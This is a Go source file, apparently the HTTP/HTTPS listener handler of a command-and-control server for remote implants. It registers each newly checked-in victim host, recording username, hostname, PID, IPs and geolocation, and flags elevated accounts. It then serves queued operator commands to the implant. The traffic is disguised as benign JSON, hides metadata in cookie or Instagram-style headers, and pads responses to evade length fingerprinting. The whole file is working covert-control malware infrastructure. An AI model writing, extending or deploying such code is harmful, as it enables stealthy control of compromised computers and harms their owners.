package communication

import (
	"net"

	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/c2profile"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"crypto/rand"
	mrand "math/rand"
	"encoding/binary"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

type ClientTime struct {
	LastHeartbeat time.Time
	TimeoutCount  int
}

var MuClientManager sync.Mutex
var ClientTimeManager = make(map[string]*ClientTime)

// extractMetadata 从三个传输通道提取 metadata（MetaInfo）：
// url(?sessionid=) / header(X-IG-App-ID) / cookie(默认)。统一裁 prepend 前缀。
// Go 的 http 客户端（尤其 HTTP/2）会把 Cookie 头里的 ";X" 规范化为 "; X"，
// 与服务端 prepend（含 ";SESSIONID=" 无空格）不一致。这里先归一化分号后的空格
// 再裁前缀，兼容 http(HTTP/1.1) 与 https(HTTP/2) 两种连线。
func extractMetadata(r *http.Request) string {
	raw := ""
	if m := r.URL.Query().Get("sessionid"); m != "" {
		raw = m
	} else if m := r.Header.Get("X-IG-App-ID"); m != "" {
		raw = m
	} else {
		raw = r.Header.Get("Cookie")
	}
	norm := strings.ReplaceAll(raw, "; ", ";")
	prependNorm := strings.ReplaceAll(config.Http_get_metadata_prepend, "; ", ";")
	return strings.TrimPrefix(norm, prependNorm)
}

// wrapResponsePad 流量填充：在响应 data 内附加随机长度 pad 字段（破除响应长度指纹）。
// 客户端 JSON 解析忽略未知字段，不影响协议；profile http.get.padding 控制开关（默认开）。
func wrapResponsePad(resp map[string]interface{}) map[string]interface{} {
	prof := c2profile.GetDefault()
	if prof == nil || !prof.HTTP.Get.Padding {
		return resp
	}
	if data, ok := resp["data"].(map[string]interface{}); ok {
		// 随机 16-31 字符 pad
		padLen := 16 + mrand.Intn(16)
		b := make([]byte, padLen)
		for i := range b {
			b[i] = byte('a' + mrand.Intn(26))
		}
		data["pad"] = string(b)
	}
	return resp
}

// listenerKeys 归一化监听器密钥：显式传入（handleOpenPort 从该监听器记录取出）优先，
// 缺省时按类型查库——单监听器场景两者等价，故显式路径是纯增量修复。
// 与 websocket 分支的 metaMasterKey 处理一致：显式密钥需按 32/16 字节归一化，
// 否则超长 VKey（如 base64 44 字符）会导致 HKDF 输入与客户端 patch 的不一致。
func listenerKeys(vkey, salt []byte, listenerType string) ([]byte, []byte) {
	if len(vkey) > 0 && len(salt) > 0 {
		return encrypt.NormalizeListenerKeyConfig(vkey, salt)
	}
	return encrypt.GetListenerKeyConfig(listenerType)
}

// GetHttp HTTP 轮询入口（未显式提供监听器密钥时按类型兜底，保持旧行为）。
// requestListenAddr 取本次请求到达的服务端本端地址（该监听器实际绑定的地址）。
// 多实例同类型时按类型查心跳配置只能取到任意一行，故优先按本端地址定位；
// 取不到时返回空串，调用方回退按类型（保持原行为）。
func requestListenAddr(r *http.Request) string {
	if a, ok := r.Context().Value(http.LocalAddrContextKey).(net.Addr); ok && a != nil {
		return a.String()
	}
	return ""
}

func GetHttp(w http.ResponseWriter, r *http.Request) {
	GetHttpWithKeys(w, r, nil, nil)
}

// GetHttpWithKeys 带本监听器密钥的 HTTP 轮询入口。
// vkey/salt 由 handleOpenPort 从该监听器的记录取出后经闭包传入（与 tcp/kcp/websocket
// 分支同一处理）：http/https 可多实例且各持独立 VKey/盐，处理器内按类型查库在同类型
// 多监听器时只能取到任意一行，MetaInfo 解密与会话密钥派生都会用错密钥。
func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) {
	encryptMetainfo := extractMetadata(r)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
		return
	}

	// listenerType 在下方按 TLS 判定（http/https），此处先取密钥再判定
	cfgType := "http"
	if r.TLS != nil {
		cfgType = "https"
	}
	metaMK, metaSalt := listenerKeys(vkey, salt, cfgType)
	// J4: 拒绝公开默认密钥连接
	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
		logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]string{"error": "监听器默认密钥被拒绝"})
		return
	}
	metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
		return
	}

	// FirstBlood 元数据长度校验
	if len(metainfo) < 10 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "bad metainfo"})
		return
	}

	uid := encrypt.BytesToMD5(metainfo)

	// https 是 http 协议族的 TLS 包装：按传输选监听器类型（决定密钥/标签/心跳/离线检测来源）。
	// https 客户端从 https 监听器生成（patch 该监听器的 vkey/salt），故 FirstBlood 也必须按 https 查 DB。
	listenerType := "http"
	if r.TLS != nil {
		listenerType = "https"
	}

	var client database.Clients
	exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
	if !exsists { // FirstBlood
		// 立即为客户端生成会话密钥（确保与客户端同步；仅首次，轮询不得重复派生覆盖唯一化后的密钥）
		if encrypt.GlobalKeyManager != nil {
			// 用本请求已解析出的同一份监听器密钥派生（原实现按类型再查一次，
			// 同类型多监听器时会与上面 MetaInfo 解密取到不同监听器的密钥）
			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, metaSalt, metaMK, metaSalt)
			if err != nil {
				logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", uid, err)
			} else {
				logx.Infof("🔑 [HTTP-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（%s监听器）\n", uid, listenerType)
			}
		}

		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = listenerType
		connection.MuClientListenerType.Unlock()

		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])

		osArray := strings.Split(osInfo, "\t")
		if len(osArray) < 3 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{"error": "bad os info"})
			return
		}
		hostName := osArray[0]
		UserName := osArray[1]
		processName := osArray[2]
		clientOs := ""
		if len(osArray) >= 4 {
			clientOs = osArray[3]
		}
		// B5: 记录批量命令能力(MetaInfo 第 6 段 "b1";旧客户端无此段恒 false)
		command.MarkBatchCapable(uid, command.ParseBatchCapability(osArray))

		// 外网 ip
		externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			externalIp = r.RemoteAddr
		}
		if externalIp == "::1" {
			externalIp = "127.0.0.1"
		}
		//地址
		//q := qqwry.NewQQwry("qqwry.dat")
		//q.Find(externalIp)
		//address := q.Country
		address, _ := qqwry.GetLocationByIP(externalIp)

		currentTime := time.Now()
		timeFormat := "2006-01-02 15:04:05"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}

		// 从监听器配置中获取心跳参数
		heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)

		database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
		database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
		database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

		// 触发客户端上线通知
		if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
			notificationManager.OnClientOnline(uid)
		}
		// B11: 发布客户端上线事件
		if command.GlobalEventBus != nil {
			command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
				"listener":    listenerType,
				"username":    UserName,
				"computer":    hostName,
				"external_ip": externalIp,
				"internal_ip": localIP,
				"pid":         strconv.Itoa(int(processID)),
				"arch":        arch,
				"os":          clientOs,
				"process":     processName,
			})
		}
		// 【会话密钥唯一化】首次注册仅一次：立即重派生（初始密钥降为 PreviousKey）并暂存，
		// 待客户端下次轮询时用初始密钥加密下发 nonce
		if encrypt.GlobalKeyManager != nil {
			nonce := make([]byte, 16)
			if _, err := rand.Read(nonce); err == nil {
				// 同上：与 MetaInfo 解密、会话密钥派生用同一份监听器密钥
				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, metaSalt, metaMK, metaSalt, nonce)
				if err != nil {
					logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
				} else {
					encrypt.StorePendingNonce(uid, &encrypt.PendingNonce{InitialKey: initialKey, Nonce: nonce})
					logx.Infof("🔑 [HTTP-FIRSTBLOOD] 客户端 %s 会话密钥唯一化完成，等待轮询下发 nonce\n", uid)
				}
			}
		}

		// 只使用高级会话密钥加密
		successData := []byte("success")
		encryptedSuccess, err := encrypt.EncryptWithSessionKey(successData, uid)
		if err != nil {
			logx.Errorf("❌ [HTTP-FIRSTBLOOD-RESPONSE] 高级会话密钥加密失败: %v\n", err)
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "Failed to encrypt response data",
			})
			return
		}
		logx.Infof("🔒 [HTTP-FIRSTBLOOD-RESPONSE] 使用高级会话密钥加密成功\n")

		pos1, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		pos2, _ := encrypt.EncodeBase64(encryptedSuccess)
		pos3, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())

		response := map[string]interface{}{
			"data": map[string]interface{}{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": map[string][]byte{
					"pos_1": pos1,
					"pos_2": pos2,
					"pos_3": pos3,
				},
			},
		}

		// 设置 Content-Type 为 JSON
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		clientTime := &ClientTime{
			LastHeartbeat: time.Now(),
			TimeoutCount:  0,
		}
		MuClientManager.Lock()
		ClientTimeManager[uid] = clientTime
		MuClientManager.Unlock()
		// 统一离线检测器注册（替代 per-client checkHeartbeats goroutine）
		if connection.GlobalOfflineDetector != nil {
			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)
			// 统一心跳：优先采用客户端上报的真实 sleep，回退监听器配置
			sleepSec := connection.ResolveSleepSeconds(osArray, hbInterval)
			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
				MuClientManager.Lock()
				delete(ClientTimeManager, uid)
				MuClientManager.Unlock()
			})
		}

		// 编码 JSON 并写入响应
		json.NewEncoder(w).Encode(wrapResponsePad(response))
	} else { // PullCommands
		// 写库去重：ClientTimeManager 存在即当前在线（离线检测器离线时会删除并写 Online:"2"）。
		// 持续轮询的客户端无需每轮 Update Online（原实现每轮写库，高频轮询造成 WAL churn），
		// 仅在重连恢复（内存态被清）时才写回 "1"。
		MuClientManager.Lock()
		_, knownOnline := ClientTimeManager[uid]
		clientTime := &ClientTime{
			LastHeartbeat: time.Now(),
			TimeoutCount:  0,
		}
		ClientTimeManager[uid] = clientTime
		MuClientManager.Unlock()
		if !knownOnline {
			database.SetClientOnline(uid, listenerType)
			// B5: 重连恢复时刷新批量能力标记(客户端可能换版本)
			command.MarkBatchCapable(uid, command.ParseBatchCapability(strings.Split(string(metainfo[9:]), "\t")))
			// 重连恢复：重新注册离线检测器并恢复连接类型映射（否则该客户端永不被离线检测、命令静默丢失）
			if connection.GlobalOfflineDetector != nil {
				_, hbInterval := database.GetListenerHeartbeatConfigByAddr(requestListenAddr(r), listenerType)
				// 统一心跳：重连恢复时重新采用客户端上报的 sleep
				metaArr := strings.Split(string(metainfo[9:]), "\t")
				sleepSec := connection.ResolveSleepSeconds(metaArr, hbInterval)
				connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
					MuClientManager.Lock()
					delete(ClientTimeManager, uid)
					MuClientManager.Unlock()
				})
			}
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = listenerType
			connection.MuClientListenerType.Unlock()
		}
		// 统一离线检测器 Touch（每次轮询都表示客户端活跃）
		if connection.GlobalOfflineDetector != nil {
			connection.GlobalOfflineDetector.Touch(uid)
		}

		var pos1, pos2, pos3 []byte

		// 【会话密钥唯一化】优先下发暂存的 nonce 协商消息（命令留待下轮）
		if pending := encrypt.TakePendingNonce(uid); pending != nil {
			b64Payload := command.BuildSessionNonceMsgWithKey(pending.InitialKey, pending.Nonce)
			if b64Payload != nil {
				pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
				pos2 = b64Payload
				pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
				response := map[string]interface{}{
					"data": map[string]interface{}{
						"log_id": encrypt.GenRandomLogID(),
						"action_rule": map[string][]byte{
							"pos_1": pos1,
							"pos_2": pos2,
							"pos_3": pos3,
						},
					},
				}
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusOK)
				json.NewEncoder(w).Encode(wrapResponsePad(response))
				logx.Infof("🔑 [HTTP-GET] 向客户端 %s 下发会话密钥 nonce\n", uid)
				return
			}
		}

		// B5: 批量拉取——开关开启且客户端上报 b1 能力时,一轮 GET 打包多条命令
		// (CMD_BATCH 帧);否则保持单条(旧客户端/开关关闭,零行为变化)
		var cmdBytes []byte
		var ok bool
		if cfg := config.GetGlobalConfig(); cfg != nil && cfg.HTTP.BatchCommands && command.IsBatchCapable(uid) {
			cmds := command.CommandQueues.GetCommands(uid, command.BatchMaxCount())
			if len(cmds) > 1 {
				cmdBytes = command.BuildBatchFrame(cmds)
				ok = cmdBytes != nil
			} else if len(cmds) == 1 {
				cmdBytes, ok = cmds[0], true
			}
		} else {
			cmdBytes, ok = command.CommandQueues.GetCommand(uid)
		}

		if ok && len(cmdBytes) > 0 {
			// 【调试关键】显示原始命令信息
			if len(cmdBytes) >= 4 {
				originalCmdType := binary.BigEndian.Uint32(cmdBytes[:4])
				logx.Debugf("🔍 [HTTP-GET-DEBUG] 原始命令号: %d, 数据长度: %d\n", originalCmdType, len(cmdBytes))
				logx.Debugf("🔍 [HTTP-GET-DEBUG] 原始数据首全4字节: %v\n", cmdBytes[:4])
			}

			// 尝试使用高级加密（与TCP/WebSocket/KCP保持一致）
			encryptedCmd, err := encrypt.EncryptWithSessionKey(cmdBytes, uid)
			if err != nil {
				// 【加密体系改造】加密失败直接返回
				logx.Warnf("⚠️ [HTTP-GET-RESPONSE] 会话密钥加密失败: %v\n", err)
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]string{"error": "会话密钥加密失败"})
				return
			} else {
				logx.Infof("🔒 [HTTP-GET-RESPONSE] 使用高级会话密钥加密\n")
			}

			cmdBase64, _ := encrypt.EncodeBase64(encryptedCmd)

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = cmdBase64
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())

			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(wrapResponsePad(response))

		} else {

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = []byte{}
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(wrapResponsePad(response))
		}

	}
}
